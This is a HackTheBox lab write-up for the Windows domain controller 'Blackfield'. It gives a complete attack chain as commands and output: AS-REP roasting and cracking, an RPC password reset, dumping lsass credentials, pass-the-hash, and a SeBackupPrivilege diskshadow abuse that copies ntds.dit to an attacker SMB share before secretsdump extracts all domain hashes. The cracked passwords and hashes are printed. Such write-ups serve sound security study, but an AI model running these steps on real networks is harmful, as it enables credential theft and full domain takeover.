---
title: "Blackfield"
date: 2021-07-10 19:30:00 +0530
categories: [HackTheBox, Windows Machines]
tags: [windows, kerberos, rpcclient, rpc-password-reset, bloodhound, sebackupprivilege, diskshadow, robocopy, diskshadow, smbserver, secretsdump, john, powershell, hackthebox]
image: /assets/img/Posts/Blackfield/Blackfield.png
---
# Enumeration
## Nmap
```bash
$ nmap -Pn -sVC -p- -oN nmap-full.txt -v --min-rate 1000 `IP`

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-13 22:53:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-06-13T22:53:32
|_  start_date: N/A
```
Domain name: `BLACKFIELD.local`

## DNS 
```bash
$ dig ANY @`IP` BLACKFIELD.local

;; ANSWER SECTION:
BLACKFIELD.local.       600     IN      A       10.10.10.192
BLACKFIELD.local.       3600    IN      NS      dc01.BLACKFIELD.local.
BLACKFIELD.local.       3600    IN      SOA     dc01.BLACKFIELD.local. hostmaster.BLACKFIELD.local. 149 900 600 86400 3600
```
Other domain-names: `dc01.BLACKFIELD.local` , `hostmaster.BLACKFIELD.local`.

## Kerberos
Enumerating users with kerbrute gives:
```bash
$ kerbrute userenum -d BLACKFIELD.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc `IP`

2021/06/13 21:48:25 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2021/06/13 21:50:08 >  [+] VALID USERNAME:       guest@BLACKFIELD.local
2021/06/13 22:01:31 >  [+] VALID USERNAME:       administrator@BLACKFIELD.local
```
Checking for AS-REP Roasting for those users:
```bash
$ GetNPUsers.py 'BLACKFIELD.local/' -usersfile users -dc-ip `IP` -format john -outputfile hashes.asreproast

Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

$ cat hashes.asreproast
$krb5asrep$support@BLACKFIELD.LOCAL:c6be395079288cc668713586d1b73ac8$fb919022470062fb3e1c2cfe14b7f01d7a807217bdb5a0034e7bda691a1b3395f64198949092850a91dc1ba7d41f587b37bab4effd398c5d27c4850f7d8112adba0f5eb695fccee61ba4dd18042e34ea3ff3cddc69aea3dc938a9d179b41f0bc5bcee695aad9631dd36d7b1e8d42d0f01c4e03f345901414f02af2501ba1353e16bb6cc9384b5e70fa8fe7b7e2f9724f022a17e6133342b66447cf98dae2ba353374cb26661894c631cf06a557ca9dbc8312d8a0618a4c7398b5e0f2669708e12e1e559a4a3066bb0e64b9688404de7059249048020d9df19420988901018b7065d3a9d9e54147edc65b8e4a5b425b8003c89948

$ john hashes.asreproast -w:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)
Session completed
```

## RPC
`enum4linux` didn't give any good results.
anonymous login is possible but rpcclient doesn't give access-denied for most of it. 
```bash
$ for i in $(cat rpc-command-list);do echo Running $i;rpcclient -U "" -N `IP` -c "$i";echo;done  | grep -iv 'error\|denied\|usage'
```

## LDAP
Anonymous login in ldap doesn't give much info.
```bash
$ ldapsearch -h `IP` -x -b "DC=BLACKFIELD,DC=local" | tee ldap-anonymous
# extended LDIF
#
# LDAPv3
# base <DC=BLACKFIELD,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
Even default nmap scripts didn't give much info:
```bash
$ nmap -p 389 --script ldap* `IP`
```

## SMB
```bash
$ smbclient -L `IP`
Enter SMBC4R3T4K3R\root's password:
dsf
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```
Anonymous login is possible, we get listing of ``profiles$`` share, which seems to contain potential users.
```bash
$ smbclient -N //`IP`/profiles$
smb: \> ls
  .                                   D        0  Wed Jun  3 22:17:12 2020
  ..                                  D        0  Wed Jun  3 22:17:12 2020
  AAlleni                             D        0  Wed Jun  3 22:17:11 2020
  ABarteski                           D        0  Wed Jun  3 22:17:11 2020
  ABekesz                             D        0  Wed Jun  3 22:17:11 2020
  ABenzies                            D        0  Wed Jun  3 22:17:11 2020
  ABiemiller                          D        0  Wed Jun  3 22:17:11 2020

[...snip...]

  ZAlatti                             D        0  Wed Jun  3 22:17:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 22:17:12 2020
  ZMalaab                             D        0  Wed Jun  3 22:17:12 2020
  ZMiick                              D        0  Wed Jun  3 22:17:12 2020
  ZScozzari                           D        0  Wed Jun  3 22:17:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 22:17:12 2020
  ZWausik                             D        0  Wed Jun  3 22:17:12 2020
```

# Foothold
## RPC 
Using `support` account credentials for RPC we get list of some users.
```bash
$ rpcclient -U 'support%#00^BlackKnight' `IP` -c "enumdomusers" | grep -vi blackfield
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
```

## Bloodhound 
Enumerating AD with `support` user's credentials:
```bash
$ bloodhound-python -u support -p '#00^BlackKnight' -c ALL -ns `IP` -d BLACKFIELD.local
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 35S
```
Loading those json files in bloodhound, marking SUPPORT@BLACKFIELD.LOCAL as owned and starting node and AUDIT2020@BLACKFIELD.LOCAL as ending node gives us:
```text
ForceChangePassword

The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user
AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current 
password.
```
[https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) shows how to reset AD password.
```bash
$ rpcclient -U 'support%#00^BlackKnight'  `IP`
rpcclient $> setuserinfo2 audit2020 23 'Caretaker@123'
```

## SMB	
```bash
smbclient //`IP`/forensic -U 'audit2020%Caretaker@123'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 18:33:16 2020
  ..                                  D        0  Sun Feb 23 18:33:16 2020
  commands_output                     D        0  Sun Feb 23 23:44:37 2020
  memory_analysis                     D        0  Fri May 29 01:58:33 2020
  tools                               D        0  Sun Feb 23 19:09:08 2020
```
memory_analysis seems interesting, it contains a zip called lsass.zip which may contain some credentials.
Downloading directly from smbclient will fail (you can use smbclient.py as an alternative). We can also mount the SMB shares:
```bash
$ mount -t cifs //`IP`/forensic /mnt -o user=audit2020,password=Caretaker@123
```

Using something like `pypykatz`, which is Mimikatz implementation in pure Python
```bash
$ pypykatz lsa minidump lsass.DMP  -o lsass-dump-output

Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368

Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d

Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
```
PTH for `svc_backup`:
```bash
$ evil-winrm -i `IP` -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3
*Evil-WinRM* PS C:\Users\svc_backup\Documents> type ..\desktop\user.txt
```

# Privesc
User `svc_backup` has SeBackupPrivilege and SeRestorePrivilege.
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Opening a smb share in kali and mounting it on windows:
```bash
$ smbserver.py -smb2support share . -username caretaker -password caretaker
---
C:> net use Z: \\10.10.14.5\share /u:caretaker caretaker
```
If `net use` command doesn't work, try using another drive letter or share name.
This will allow us to backup and access any files and folders on the system. The ``NTDS.dit`` file is the database for Active Directory that is present on all domain controllers. It stores hashes for all domain users as well information about other objects in the domain. These hashes can be extracted from the file by using the Impacket tool ``secretsdump.py``. The script also requires the ``SAM and SYSTEM registry`` hives in order to decrypt the file.
These hives can be exported using the ``reg save`` command.
```powershell
reg save HKLM\System System.hive
reg save hklm\sam Sam.hive
reg save HKLM\security Security.hive
```
The ``ntds.dit`` file is present in the ``C:\Windows\ntds`` folder.  Unfortunately, the ntds.dit file is locked for use by the system and can't be copied directly. Files and folders can be backed up using the /B switch of ``robocopy``.
```bash
C:\> robocopy /B C:\Windows\ntds\ .\ntds   

The process cannot access the file because it is being used by another process.
```
Windows provides a feature known as Volume Shadow Copy to address this kind of problem. A shadow copy is a read-only snapshot of the disk that permits files to be accessed even if they're in use. Usually, creating a shadow copy requires administrative privileges, and many utilities do perform this check. 
**However the ``diskshadow`` utility will allow us to perform this action with just the SeBackup and SeRestore privileges.**
The following script can create a shadow copy of the C: , exposed as X: .
```powershell
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
add volume c: alias caretaker
create
expose %caretaker% x:
exec "C:\Windows\System32\cmd.exe" /C copy x:\windows\ntds\ntds.dit c:\temp\ntds.dit
```
We need to convert the script to Windows format, as diskshadow expects DOS style CRLF line terminators. This can be done using the unix2dos command.
```bash	
unix2dos disk-shadow-script.txt
```
or you can just add a random char as CRLF at end of each line.
Then you can load this script in ``diskshadow``:
```powershell
diskshadow /s disk-shadow-script.txt
```
Script shows error because last line tries to copy ``ntds.dit`` manually, which we know isnt possible. 
![diskshadow-error](/assets/img/Posts/Blackfield/diskshadow-error.png)
We can now use ``robocopy`` to backup the X:\Windows\ntds\ntds.dit file.
```powershell
robocopy /B X:\Windows\ntds\ .\ntds
```
 OR 
you can use [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug) instead of robocopy after you make ``x:`` share with diskshadow, robocopy copies the whole folder, with SeBackupPrivilegeCmdLets you can copy individual files.
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Copy-FileSeBackupPrivilege x:\windows\NTDS\ntds.dit Z:\ntds.dit
reg save HKLM\System System.hive
```
Then you can easily use `secretsdump.py` from impacket to dump those stored hashes:
```bash
$ secretsdump.py -system System.hive -ntds ntds.dit LOCAL
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
```

Simply doing a PTH gives administrator's shell:
```bash
$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\desktop\root.txt
ce9c2c3f6b95a901604aea4254e94cba
```
